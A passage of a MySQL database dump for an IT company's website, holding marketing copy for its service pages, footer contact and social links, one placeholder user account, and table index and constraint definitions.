  `icon` varchar(255) DEFAULT NULL,
  `type` varchar(255) NOT NULL,
  `sub_head` varchar(1024) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `ui_services`
--

INSERT INTO `ui_services` (`id`, `heading`, `description`, `icon`, `type`, `sub_head`, `created_at`, `updated_at`) VALUES
(1, 'User Research', 'Utilizing user research to create intuitive and engaging designs that enhance the user experience.', '1722408817.svg', 'experience', NULL, '2024-07-31 01:53:37', '2024-07-31 01:53:37'),
(2, 'Prototyping', 'Efficient prototyping processes ensure rapid iteration and refinement, accelerating the design cycle.', '1722409330.svg', 'experience', NULL, '2024-07-31 02:02:10', '2024-07-31 02:02:10'),
(3, 'UX Design', 'Crafting intuitive user experiences that drive engagement and satisfaction across digital platforms.', '1722409368.svg', 'experience', NULL, '2024-07-31 02:02:48', '2024-07-31 02:53:39'),
(4, 'Figma,Photoshop,Sketch,Adobe XD,Zeppelin,Illustrator,Kotlin,Swift,PHP,MariaDB,AWS', NULL, '', 'tools', NULL, '2024-07-31 02:08:46', '2024-07-31 02:08:46'),
(5, 'Development Consulting', 'Tailored strategies and guidance to ensure efficient implementation and seamless integration of innovative technologies.', '', 'enterprises', NULL, '2024-07-31 02:20:50', '2024-07-31 02:20:50'),
(6, 'Design and Prototyping', 'Transforming concepts into interactive prototypes for visually captivating and user-centric designs.', '', 'enterprises', NULL, '2024-07-31 02:21:11', '2024-07-31 02:21:11'),
(7, 'Discovery', 'During the discovery phase, we conduct thorough market research to identify industry trends and competitors\' strategies. We also analyze user behaviors and preferences to gain valuable insights', '1722410776.png', 'design', 'into their needs and expectations. By uncovering key insights, we establish a solid framework to guide our design decisions and ensure the success of your project', '2024-07-31 02:26:16', '2024-07-31 02:26:16'),
(8, 'Validate', 'During the validation phase, we engage in extensive user testing to gather real-world feedback and validate our design decisions. Through surveys and feedback sessions, we solicit input from users to confirm that our solutions effectively address their pain points and fulfill their requirements.', '1722410914.png', 'design', 'By prioritizing user feedback and iterating on our designs accordingly, we ensure that the final product not only meets but exceeds user expectations. This iterative process allows us to refine and optimize our solutions, ultimately setting the stage for a successful and user-centric design outcome.', '2024-07-31 02:28:34', '2024-07-31 02:28:34'),
(9, 'Design', 'Our design process combines creativity with strategic thinking, ensuring that every aspect of the user interface is meticulously crafted to resonate with your target audience. We pay careful attention to details such as color schemes, typography, and layout, aiming to create a cohesive and memorable visual identity for your brand.', '1722411004.png', 'design', 'Through iterative design iterations and collaborative feedback sessions, we refine our concepts to perfection, striving to exceed industry standards and deliver an unparalleled user experience. With our team of seasoned designers at the helm, you can trust us to transform your vision into a stunning reality that captivates and delights users at every touchpoint.', '2024-07-31 02:30:04', '2024-07-31 02:30:04');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) NOT NULL,
  `contact` varchar(255) NOT NULL,
  `remember_token` varchar(100) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `name`, `email`, `email_verified_at`, `password`, `contact`, `remember_token`, `created_at`, `updated_at`) VALUES
(5, 'user', 'user@gmail.com', NULL, '$2y$10$TPvioa5VbbXrr2ueoX4mteK3V0p9z5iak9OebDZ0bHxq7Px3/G1Um', '573856783', NULL, '2023-10-17 10:23:16', '2023-10-17 10:23:16');

-- --------------------------------------------------------

--
-- Table structure for table `websites`
--

CREATE TABLE `websites` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `heading` varchar(255) NOT NULL,
  `discription` varchar(255) DEFAULT NULL,
  `icon` varchar(225) DEFAULT NULL,
  `type` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `websites`
--

INSERT INTO `websites` (`id`, `heading`, `discription`, `icon`, `type`, `created_at`, `updated_at`) VALUES
(1, 'Development Consulting', 'Tailored strategies and expert guidance to optimize your projects\' success from start to finish.', '', 'service-solution', '2024-07-30 02:39:46', '2024-07-30 05:02:57'),
(2, 'Design and Prototyping', 'Transforming your ideas into interactive prototypes with precision and creativity.', NULL, 'service-solution', '2024-07-30 02:43:10', '2024-07-30 02:43:10'),
(4, 'End-to-End Development', 'Comprehensive solutions from concept to deployment, ensuring seamless execution and success', NULL, 'service-solution', '2024-07-30 02:54:29', '2024-07-30 02:54:29'),
(6, 'Tech Stack Choice', 'Careful selection of technologies ensures optimal performance and scalability for your project needs. We prioritize the use of cutting-edge tools to deliver innovative and efficient solutions', '1722327552.svg', 'service-performance', '2024-07-30 03:19:12', '2024-07-30 03:19:12'),
(7, 'Multi Tenant Architecture', 'Efficiently scale your software with our tailored designs, optimizing resources and enhancing performance for diverse user bases with cost-effective solutions.', '1722327788.svg', 'service-performance', '2024-07-30 03:23:08', '2024-07-30 03:23:08'),
(8, 'External Services Integration', 'Seamlessly incorporate third-party services to enhance functionality and efficiency. Our approach ensures smooth integration, maximizing the potential of your software solution.', '1722327817.svg', 'service-performance', '2024-07-30 03:23:37', '2024-07-30 03:23:37'),
(9, 'Scalability On Demand', 'Seamlessly adjust your software\'s capacity to meet fluctuating demand, ensuring uninterrupted performance. Our flexible approach optimizes resource allocation for scalability.', '1722327843.svg', 'service-performance', '2024-07-30 03:24:03', '2024-07-30 03:24:03'),
(10, 'Security Audit', 'Rigorous assessments fortify your software against vulnerabilities and threats. We prioritize robust security measures to safeguard your solutions.', '1722327868.svg', 'service-performance', '2024-07-30 03:24:28', '2024-07-30 03:24:28'),
(11, 'CRMs Platforms', NULL, '1722328689.svg', 'service-application', '2024-07-30 03:38:09', '2024-07-30 03:38:09'),
(12, 'ERPs Platforms', NULL, '1722328717.svg', 'service-application', '2024-07-30 03:38:37', '2024-07-30 03:38:37'),
(13, 'Marketing Software', NULL, '1722329215.svg', 'service-application', '2024-07-30 03:46:55', '2024-07-30 03:46:55');

-- --------------------------------------------------------

--
-- Table structure for table `website_controls`
--

CREATE TABLE `website_controls` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `key` varchar(255) NOT NULL,
  `value` varchar(3000) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `website_controls`
--

INSERT INTO `website_controls` (`id`, `key`, `value`, `created_at`, `updated_at`) VALUES
(1, 'about_detail', '<p>Creative IT Park delivers automated solutions to streamline your manual processes, embracing digitalization as the future. We offer tailored solutions to meet each client\'s unique needs. Creative IT Park helps accelerate your business growth by specialising in mobile apps, websites, AR-VR, and in digital marketing.</p>', NULL, NULL),
(2, 'about_mission_heading', 'Our Purpose', NULL, NULL),
(3, 'about_mission_sub_heading', 'IT Enterprise', NULL, NULL),
(4, 'about_mission_tag', 'Boost Innovation ,	Powered by World-Class Tech Teams,Our Services Elevate Your Business  1', NULL, NULL),
(5, 'about_mission_description', '<p><span style=\"background-color:hsl(0,0%,100%);color:rgb(219,119,18);\">Our purpose is to transform businesses through effortless digital transformation. By providing automated solutions that replace manual processes, we create a pathway to a more efficient and advanced future. With expertise in mobile apps, websites, AR-VR development, and game development, we tailor solutions to drive our clients\' growth. Committed to excellence, we aim to empower brands with exceptional IT solutions, helping them reach new heights of success in the digital era.</span></p>', NULL, NULL),
(6, 'about_mission_image', 'about/1722922414.png', NULL, NULL),
(7, 'about_agency_heading', 'Elevate Your Vision in the Digital Age 1', NULL, NULL),
(8, 'about_agency_sub_heading', 'The Future of Software', NULL, NULL),
(9, 'about_agency_description', '<p>In a world where innovation reigns supreme, we excel at transforming your ideas or business into dynamic success stories. Our team navigates the digital landscape with finesse, harnessing cutting-edge technologies and tailored strategies to suit your unique vision.</p><p>&nbsp;</p><p>Whether you\'re a visionary entrepreneur with a game-changing idea or an established business eager to evolve, we’re dedicated to supporting you at every turn. From the spark of conception to seamless execution, we bring your ideas to life efficiently and sustainably.</p><p>&nbsp;</p><p>At the heart of our mission is a commitment to embracing change and innovation. Let us empower you to seize the opportunities of the digital era and turn your dreams into reality! 1</p>', NULL, NULL),
(10, 'about_agency_tag', 'Embrace Change and Innovation ,Turning Dreams into Reality 1', NULL, NULL),
(11, 'about_agency_image', 'about/1722922414.png', NULL, NULL),
(12, 'footer_address', 'Plot no #14E, Fazal e Haq Road, G6/2, Blue Area, Islamabad.Near Historic Centre, València. % Spain', NULL, NULL),
(13, 'footer_email', 'info@creativeitpark.org', NULL, NULL),
(14, 'footer_number', '+92 332 5525283 , +34 631 50 85 01', NULL, NULL),
(15, 'footer_social', 'Facebook', NULL, NULL),
(16, 'footer_link', 'https://m.facebook.com/creativeitparkofficial/', NULL, NULL),
(17, 'footer_link1', 'https://www.instagram.com/creative_it_park_offical2', NULL, NULL),
(18, 'footer_link2', 'https://www.linkedin.com/company/creative-it-park-pvt-ltd/?originalSubdomain=pk', NULL, NULL),
(19, 'footer_link3', 'https://twitter.com/CreativeIT76529', NULL, NULL),
(20, 'footer_link4', 'https://www.threads.net/@creative_it_park_offical', NULL, NULL),
(21, 'footer_image', 'footer/1729588527.png', NULL, NULL),
(30, 'footer_social1', 'Instagram', NULL, NULL),
(31, 'footer_social2', 'LinkedIn', NULL, NULL),
(32, 'footer_social3', 'X', NULL, NULL),
(33, 'footer_social4', 'Threads', NULL, NULL),
(34, 'footer_image_dark', 'footer/1729588527.png', NULL, NULL);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admins`
--
ALTER TABLE `admins`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `admins_email_unique` (`email`);

--
-- Indexes for table `admin_password_resets`
--
ALTER TABLE `admin_password_resets`
  ADD KEY `admin_password_resets_email_index` (`email`);

--
-- Indexes for table `app_services`
--
ALTER TABLE `app_services`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `blogs`
--
ALTER TABLE `blogs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `careers`
--
ALTER TABLE `careers`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `careers_email_unique` (`email`);

--
-- Indexes for table `career_contacts`
--
ALTER TABLE `career_contacts`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `clients`
--
ALTER TABLE `clients`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cloud_services`
--
ALTER TABLE `cloud_services`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `contacts`
--
ALTER TABLE `contacts`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `contacts_email_unique` (`email`);

--
-- Indexes for table `day_vendors`
--
ALTER TABLE `day_vendors`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `events`
--
ALTER TABLE `events`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `failed_jobs`
--
ALTER TABLE `failed_jobs`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `failed_jobs_uuid_unique` (`uuid`);

--
-- Indexes for table `faqs`
--
ALTER TABLE `faqs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `industries`
--
ALTER TABLE `industries`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `model_has_permissions`
--
ALTER TABLE `model_has_permissions`
  ADD PRIMARY KEY (`permission_id`,`model_id`,`model_type`),
  ADD KEY `model_has_permissions_model_id_model_type_index` (`model_id`,`model_type`);

--
-- Indexes for table `model_has_roles`
--
ALTER TABLE `model_has_roles`
  ADD PRIMARY KEY (`role_id`,`model_id`,`model_type`),
  ADD KEY `model_has_roles_model_id_model_type_index` (`model_id`,`model_type`);

--
-- Indexes for table `news`
--
ALTER TABLE `news`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `new_table_name`
--
ALTER TABLE `new_table_name`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `password_resets`
--
ALTER TABLE `password_resets`
  ADD KEY `password_resets_email_index` (`email`);

--
-- Indexes for table `permissions`
--
ALTER TABLE `permissions`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `permissions_name_guard_name_unique` (`name`,`guard_name`);

--
-- Indexes for table `personal_access_tokens`
--
ALTER TABLE `personal_access_tokens`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `personal_access_tokens_token_unique` (`token`),
  ADD KEY `personal_access_tokens_tokenable_type_tokenable_id_index` (`tokenable_type`,`tokenable_id`);

--
-- Indexes for table `portfolios`
--
ALTER TABLE `portfolios`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `roles`
--
ALTER TABLE `roles`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `roles_name_guard_name_unique` (`name`,`guard_name`);

--
-- Indexes for table `role_has_permissions`
--
ALTER TABLE `role_has_permissions`
  ADD PRIMARY KEY (`permission_id`,`role_id`),
  ADD KEY `role_has_permissions_role_id_foreign` (`role_id`);

--
-- Indexes for table `sliders`
--
ALTER TABLE `sliders`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `social_posts`
--
ALTER TABLE `social_posts`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `subscribes`
--
ALTER TABLE `subscribes`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `subscribes_email_unique` (`email`);

--
-- Indexes for table `teams`
--
ALTER TABLE `teams`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `team_experiences`
--
ALTER TABLE `team_experiences`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `testimonials`
--
ALTER TABLE `testimonials`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ui_services`
--
ALTER TABLE `ui_services`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `users_email_unique` (`email`);

--
-- Indexes for table `websites`
--
ALTER TABLE `websites`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `website_controls`
--
ALTER TABLE `website_controls`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admins`
--
ALTER TABLE `admins`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `app_services`
--
ALTER TABLE `app_services`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=45;

--
-- AUTO_INCREMENT for table `blogs`
--
ALTER TABLE `blogs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `careers`
--
ALTER TABLE `careers`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=159;

--
-- AUTO_INCREMENT for table `career_contacts`
--
ALTER TABLE `career_contacts`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `clients`
--
ALTER TABLE `clients`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `cloud_services`
--
ALTER TABLE `cloud_services`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `contacts`
--
ALTER TABLE `contacts`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=228;

--
-- AUTO_INCREMENT for table `day_vendors`
--
ALTER TABLE `day_vendors`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `events`
--
ALTER TABLE `events`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT for table `failed_jobs`
--
ALTER TABLE `failed_jobs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `faqs`
--
ALTER TABLE `faqs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `industries`
--
ALTER TABLE `industries`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=20;

--
-- AUTO_INCREMENT for table `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=44;

--
-- AUTO_INCREMENT for table `news`
--
ALTER TABLE `news`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `new_table_name`
--
ALTER TABLE `new_table_name`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `permissions`
--
ALTER TABLE `permissions`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `personal_access_tokens`
--
ALTER TABLE `personal_access_tokens`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `portfolios`
--
ALTER TABLE `portfolios`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=37;

--
-- AUTO_INCREMENT for table `roles`
--
ALTER TABLE `roles`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=22;

--
-- AUTO_INCREMENT for table `sliders`
--
ALTER TABLE `sliders`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `social_posts`
--
ALTER TABLE `social_posts`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `subscribes`
--
ALTER TABLE `subscribes`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=60;

--
-- AUTO_INCREMENT for table `teams`
--
ALTER TABLE `teams`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=29;

--
-- AUTO_INCREMENT for table `team_experiences`
--
ALTER TABLE `team_experiences`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `testimonials`
--
ALTER TABLE `testimonials`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;

--
-- AUTO_INCREMENT for table `ui_services`
--
ALTER TABLE `ui_services`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `websites`
--
ALTER TABLE `websites`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `website_controls`
--
ALTER TABLE `website_controls`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `model_has_permissions`
--
ALTER TABLE `model_has_permissions`
  ADD CONSTRAINT `model_has_permissions_permission_id_foreign` FOREIGN KEY (`permission_id`) REFERENCES `permissions` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `model_has_roles`
--
ALTER TABLE `model_has_roles`
  ADD CONSTRAINT `model_has_roles_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `role_has_permissions`
--
ALTER TABLE `role_has_permissions`
  ADD CONSTRAINT `role_has_permissions_permission_id_foreign` FOREIGN KEY (`permission_id`) REFERENCES `permissions` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `role_has_permissions_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
